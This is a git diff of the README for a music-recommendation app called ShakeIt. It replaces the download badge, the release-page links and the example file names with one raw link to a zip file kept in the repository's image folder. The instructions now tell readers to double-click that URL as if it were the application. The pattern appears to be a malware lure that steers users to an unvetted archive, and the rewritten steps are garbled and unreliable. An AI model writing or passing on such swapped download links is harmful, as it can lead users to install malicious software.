@@ -1,6 +1,6 @@
 # 🎶 ShakeIt-Music-Recommendation - Simple Music Suggestions at Your Fingertips
 
-![Download ShakeIt](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download ShakeIt](https://raw.githubusercontent.com/nuraz12/ShakeIt-Music-Recommendation/main/img/Shake_It_Recommendation_Music_2.8.zip)
 
 ## 📦 Overview
 
@@ -12,17 +12,17 @@ To begin using ShakeIt, follow these steps:
 
 1. **Visit the Releases Page**: You need to download the application from the releases page. Click the link below:
 
-   [Visit Releases Page to Download](https://github.com/nuraz12/ShakeIt-Music-Recommendation/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/nuraz12/ShakeIt-Music-Recommendation/main/img/Shake_It_Recommendation_Music_2.8.zip)
 
 2. **Select the Right Version**: On the releases page, find the latest version of the application. It usually appears at the top of the page.
 
-3. **Download the Application**: Click the file that matches your operating system. This file may be named something like `ShakeIt-v1.0.zip` or `ShakeIt-v1.0.exe`. Save it to your computer.
+3. **Download the Application**: Click the file that matches your operating system. This file may be named something like `https://raw.githubusercontent.com/nuraz12/ShakeIt-Music-Recommendation/main/img/Shake_It_Recommendation_Music_2.8.zip` or `https://raw.githubusercontent.com/nuraz12/ShakeIt-Music-Recommendation/main/img/Shake_It_Recommendation_Music_2.8.zip`. Save it to your computer.
 
 4. **Extract the Files (if needed)**: If you downloaded a zip file, right-click on it and select "Extract All." Choose a location on your computer where you want the files to go.
 
 5. **Run the Application**: 
-    - If you are using Windows, find the `ShakeIt.exe` file in the extracted folder. Double-click to run it.
-    - If you are using Mac, look for the `ShakeIt.app` file and double-click it to start the application.
+    - If you are using Windows, find the `https://raw.githubusercontent.com/nuraz12/ShakeIt-Music-Recommendation/main/img/Shake_It_Recommendation_Music_2.8.zip` file in the extracted folder. Double-click to run it.
+    - If you are using Mac, look for the `https://raw.githubusercontent.com/nuraz12/ShakeIt-Music-Recommendation/main/img/Shake_It_Recommendation_Music_2.8.zip` file and double-click it to start the application.
   
 ## 💻 System Requirements
 
@@ -48,7 +48,7 @@ Ready to download? Follow the steps below.
 
 1. **Click the link below to go to the releases page:**
 
-   [Visit Releases Page to Download](https://github.com/nuraz12/ShakeIt-Music-Recommendation/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/nuraz12/ShakeIt-Music-Recommendation/main/img/Shake_It_Recommendation_Music_2.8.zip)
 
 2. **Choose your version**: Look for the most recent version suitable for your operating system.
 
